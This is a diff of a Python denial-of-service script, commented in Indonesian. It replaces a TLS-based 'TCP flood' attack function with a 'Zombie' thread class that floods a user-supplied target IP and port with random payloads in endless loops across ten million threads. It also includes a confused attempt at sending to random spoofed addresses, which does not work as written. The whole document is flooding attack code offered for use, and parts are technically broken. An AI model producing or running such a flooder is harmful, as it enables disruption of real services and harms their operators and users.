@@ -1,55 +1,43 @@
+import socket
 import random
 import threading
-import os
-import sys
-import socket
-import ssl
 
-# Path ke sertifikat dan kunci pribadi Anda
-certfile = "server.pem"
-keyfile = "server-key.pem"
+class Zombie(threading.Thread):
+    def __init__(self, target_ip, target_port):
+        threading.Thread.__init__(self)
+        self.target_ip = target_ip
+        self.target_port = target_port
 
+    def run(self):
+        while True:
+            try:
+                fake_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+                fake_port = random.randint(1, 65535)
+                payload_size = random.randint(10000, 1000000)
+                payload = random._urandom(payload_size)
 
-def tcp_flood(ip, port, times):
-    byte1 = os.urandom(2024)
-    addr = (ip, port)
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.setblocking(0)  # Menghindari penundaan saat mengirim
+                s.connect_ex((self.target_ip, self.target_port))
 
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # Membuat koneksi SSL/TLS dengan versi yang sesuai
-        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
-        context.load_cert_chain(certfile, keyfile)
-        s = context.wrap_socket(s, server_hostname=ip)
-        s.connect(addr)
-        for _ in range(times):
-            s.send(byte1)
-    except ConnectionRefusedError:
-        print(f"Koneksi ke {ip}:{port} ditolak. Mungkin server tidak aktif.")
-    except ssl.SSLError as e:
-        print(f"Terjadi kesalahan SSL/TLS: {e}")
-    except Exception as e:
-        print(f"Terjadi kesalahan selama serangan banjir TCP: {e}")
-    finally:
-        s.close()
+                while True:
+                    s.send(payload)
+                    s.sendto(payload, (fake_ip, fake_port))
 
+                s.close()
+            except socket.error as e:
+                pass  # Mengabaikan kesalahan tanpa menampilkannya
 
-if __name__ == "__main__":
-    if len(sys.argv) != 6:
-        print(
-            "Penggunaan: python script.py tcp <target_ip> <target_port> <jumlah_kali> <jumlah_thread>"
-        )
-    else:
-        attack_type = sys.argv[1].lower()
-        if attack_type != "tcp":
-            print("Jenis serangan tidak valid. Gunakan 'tcp'.")
-            sys.exit(1)
+target_ip = input("Masukkan alamat IP target: ")
+target_port = int(input("Masukkan port target: "))
 
-        ip = sys.argv[2]
-        port = int(sys.argv[3])
-        times = int(sys.argv[4])
-        thread_count = int(sys.argv[5])
+jumlah_zombie = 10000000
 
-        print(f"Server diserang dengan serangan {attack_type}!")
+zombies = []
+for _ in range(jumlah_zombie):
+    zombie = Zombie(target_ip, target_port)
+    zombies.append(zombie)
+    zombie.start()
 
-        for _ in range(thread_count):
-            threading.Thread(target=tcp_flood, args=(ip, port, times)).start()
+for zombie in zombies:
+    zombie.join()
